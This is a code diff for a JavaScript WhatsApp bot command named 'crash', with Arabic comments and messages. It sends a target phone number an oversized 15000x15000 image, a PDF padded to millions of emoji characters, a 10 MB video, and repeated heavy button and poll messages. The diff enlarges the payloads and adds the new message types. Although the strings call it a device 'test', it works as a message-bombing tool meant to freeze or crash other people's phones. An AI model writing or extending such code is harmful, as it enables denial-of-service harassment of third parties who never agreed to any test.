@@ -1,6 +1,4 @@
-const fs = require('fs');
 const axios = require('axios');
-const path = require('path');
 
 module.exports = async ({ sock, msg, text, reply }) => {
   if (!text.startsWith("crash")) return;
@@ -16,19 +14,19 @@ module.exports = async ({ sock, msg, text, reply }) => {
   try {
     await reply(`🚨 جاري إرسال ملفات اختبار التعطيل إلى ${number}...`);
 
-    // تحميل صورة ضخمة
-    const imageUrl = "https://via.placeholder.com/10000x10000.jpg?text=CRASH_TEST_IMAGE";
-    const imageResponse = await axios.get(imageUrl, { responseType: 'arraybuffer' });
-    const imageBuffer = Buffer.from(imageResponse.data, 'binary');
+    // صورة ضخمة 15000x15000
+    const hugeImageUrl = "https://via.placeholder.com/15000x15000.jpg?text=CRASH_TEST_IMAGE";
+    const imgResp = await axios.get(hugeImageUrl, { responseType: 'arraybuffer' });
+    const imgBuffer = Buffer.from(imgResp.data, 'binary');
 
     await sock.sendMessage(jid, {
-      image: imageBuffer,
-      caption: "📸 صورة ضخمة لاختبار قدرة الجهاز"
+      image: imgBuffer,
+      caption: "📸 صورة ضخمة جداً لاختبار قدرة الجهاز"
     });
 
-    // إنشاء PDF كبير جدًا
-    const longText = '🔥'.repeat(50000);
-    const fakePdf = Buffer.from(`
+    // PDF ضخم 5 ميغابايت
+    const bigText = '🔥'.repeat(5 * 1024 * 1024);
+    const bigPdf = Buffer.from(`
       %PDF-1.4
       1 0 obj
       << /Type /Catalog /Pages 2 0 R >>
@@ -41,9 +39,9 @@ module.exports = async ({ sock, msg, text, reply }) => {
          /Contents 4 0 R /Resources << >> >>
       endobj
       4 0 obj
-      << /Length ${longText.length} >>
+      << /Length ${bigText.length} >>
       stream
-      ${longText}
+      ${bigText}
       endstream
       endobj
       xref
@@ -61,15 +59,49 @@ module.exports = async ({ sock, msg, text, reply }) => {
     `);
 
     await sock.sendMessage(jid, {
-      document: fakePdf,
+      document: bigPdf,
       mimetype: "application/pdf",
-      fileName: "crash_test_file.pdf"
+      fileName: "crash_test_file_5MB.pdf"
     });
 
-    await reply(`✅ تم إرسال ملفات crash إلى ${number}`);
+    // فيديو ضخم 10 ميغابايت
+    const videoUrl = "https://sample-videos.com/video123/mp4/720/big_buck_bunny_720p_10mb.mp4";
+    const videoResp = await axios.get(videoUrl, { responseType: 'arraybuffer' });
+    const videoBuffer = Buffer.from(videoResp.data, 'binary');
+
+    await sock.sendMessage(jid, {
+      video: videoBuffer,
+      caption: "🎥 فيديو ضخم لاختبار الجهاز"
+    });
+
+    // رسالة أزرار ثقيلة
+    await sock.sendMessage(jid, {
+      text: '⚠️ رسالة أزرار ثقيلة جدًا لاختبار الأداء\n'.repeat(30),
+      buttons: [
+        { buttonId: 'btn1', buttonText: { displayText: 'اختبار 1' }, type: 1 },
+        { buttonId: 'btn2', buttonText: { displayText: 'اختبار 2' }, type: 1 },
+        { buttonId: 'btn3', buttonText: { displayText: 'اختبار 3' }, type: 1 },
+      ],
+      headerType: 1
+    });
+
+    // رسالة استفتاء (Poll)
+    await sock.sendMessage(jid, {
+      poll: {
+        name: '🛑 استفتاء اختبار الأداء',
+        options: [
+          { optionName: 'اختيار 1' },
+          { optionName: 'اختيار 2' },
+          { optionName: 'اختيار 3' },
+        ]
+      },
+      text: 'يرجى اختيار أحد الخيارات لاختبار استجابة الجهاز\n'.repeat(20)
+    });
+
+    await reply(`✅ تم إرسال ملفات وأوامر crash القوية إلى ${number}`);
 
   } catch (err) {
     console.error(err);
-    await reply(`❌ فشل الإرسال إلى: ${number}`);
+    await reply(`❌ فشل الإرسال إلى: ${number}\nالخطأ: ${err.message}`);
   }
 };
